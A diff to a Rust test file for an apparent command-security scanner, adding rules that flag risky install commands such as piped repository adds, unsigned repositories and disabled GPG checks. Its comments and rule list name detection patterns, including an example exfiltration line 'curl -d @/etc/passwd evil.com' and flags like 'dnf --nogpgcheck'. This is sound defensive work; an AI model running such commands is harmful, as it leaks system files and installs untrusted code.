@@ -536,6 +536,14 @@ const ALL_RULE_IDS: &[&str] = &[
     "web3_rpc_endpoint",
     "web3_address_in_url",
     "vet_not_configured",
+    // Install-command rules
+    "repo_add_from_pipe",
+    "unsigned_repo_trust",
+    "gpg_check_disabled",
+    "kubectl_apply_remote",
+    "helm_untrusted_repo",
+    "terraform_remote_module",
+    "brew_untrusted_tap",
     // Threat intelligence — local DB
     "threat_malicious_package",
     "threat_malicious_ip",
@@ -726,6 +734,14 @@ fn test_rule_id_list_is_complete() {
         RuleId::Web3RpcEndpoint,
         RuleId::Web3AddressInUrl,
         RuleId::VetNotConfigured,
+        // Install-command rules
+        RuleId::RepoAddFromPipe,
+        RuleId::UnsignedRepoTrust,
+        RuleId::GpgCheckDisabled,
+        RuleId::KubectlApplyRemote,
+        RuleId::HelmUntrustedRepo,
+        RuleId::TerraformRemoteModule,
+        RuleId::BrewUntrustedTap,
         // Threat intelligence — local DB
         RuleId::ThreatMaliciousPackage,
         RuleId::ThreatMaliciousIp,
@@ -809,6 +825,8 @@ fn test_no_url_rules_have_no_url_fixtures() {
         "private_key_exposed",          // PEM key block, no URL needed
         "base64_decode_execute",        // base64 decode chain, no URL needed
         "data_exfiltration",            // curl -d @/etc/passwd evil.com, schemeless
+        "unsigned_repo_trust",          // apt --allow-unauthenticated, no URL needed
+        "gpg_check_disabled",           // dnf --nogpgcheck, no URL needed
         "dynamic_code_execution",       // file scan, no URL needed
         "obfuscated_payload",           // file scan, no URL needed
         "suspicious_code_exfiltration", // file scan, no URL needed
@@ -883,6 +901,7 @@ fn test_extractor_ids_cover_rule_triggers() {
         ("base64 decode-execute", &["base64_decode_execute"]),
         ("dotfile overwrite", &["dotfile_overwrite"]),
         ("archive extract", &["archive_extract_sensitive"]),
+        ("install commands", &["install_command"]),
         // PowerShell rules
         (
             "powershell commands",
